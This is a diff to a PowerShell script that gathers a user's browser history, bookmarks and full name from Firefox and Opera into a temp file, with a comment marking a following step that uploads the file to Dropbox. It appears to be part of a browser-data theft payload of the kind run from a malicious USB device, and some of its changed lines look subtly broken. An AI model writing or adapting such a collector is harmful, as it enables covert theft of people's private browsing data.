@@ -48,7 +48,6 @@ function Get-BrowserData {
                 User = $env:UserName
                 Browser = $Browser
                 DataType = $DataType
-		Name = $Name
                 Data = $_
             }
         }
@@ -67,9 +66,7 @@ Get-BrowserData -Browser "firefox" -DataType "history" >> $env:TMP\--BrowserData
 
 Get-BrowserData -Browser "opera" -DataType "history" >> $env:TMP\--BrowserData.txt
 
-Get-BrowserData -Browser "opera" -DataType "bookmarks" >> $env:TMP\--BrowserData.txt
-
-Get-fullName -Name "$fullName" -Name "Full Name" >> $env:TMP\--BrowserData.txt
+Get-BrowserData -Browser "name" -DataType "$fullName" >> $env:TMP\--BrowserData.txt
 
 # Upload output file to dropbox
 
